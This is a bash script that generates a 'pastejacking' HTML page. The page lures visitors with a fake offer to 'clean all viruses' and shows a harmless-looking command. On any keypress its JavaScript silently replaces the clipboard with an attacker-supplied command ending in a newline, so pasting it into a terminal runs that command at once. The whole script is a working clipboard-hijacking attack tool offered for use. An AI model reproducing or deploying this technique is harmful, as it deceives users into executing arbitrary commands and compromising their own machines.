#!/bin/bash
echo """
<html>
    <body>
        Copy This Command To Clean All Viruses On Your Pc
        </br>

        <p>echo "NoVirus"</p>
        <script>
            function copyTextToClipboard(text) {
              var textArea = document.createElement("textarea");
              textArea.style.position = 'fixed';
              textArea.style.top = 0;
              textArea.style.left = 0;
              textArea.style.width = '2em';
              textArea.style.height = '2em';
              textArea.style.padding = 0;
              textArea.style.border = 'none';
              textArea.style.outline = 'none';
              textArea.style.boxShadow = 'none';
              textArea.style.background = 'transparent';
              textArea.value = text;

              document.body.appendChild(textArea);

              textArea.select();

              try {
                var successful = document.execCommand('copy');
                var msg = successful ? 'successful' : 'unsuccessful';
                console.log('Copying text command was ' + msg);
              } catch (err) {
                console.log('Oops, unable to copy');
              }

              document.body.removeChild(textArea);
            }

            document.addEventListener('keydown', function(event) {
                var ms = 800;  
                var start = new Date().getTime();
                var end = start;
                while(end < start + ms) {
                    end = new Date().getTime();
                } 
                copyTextToClipboard('$1\n');
            });

        </script>
    </body>
</html>
""" >> pastejacking.html
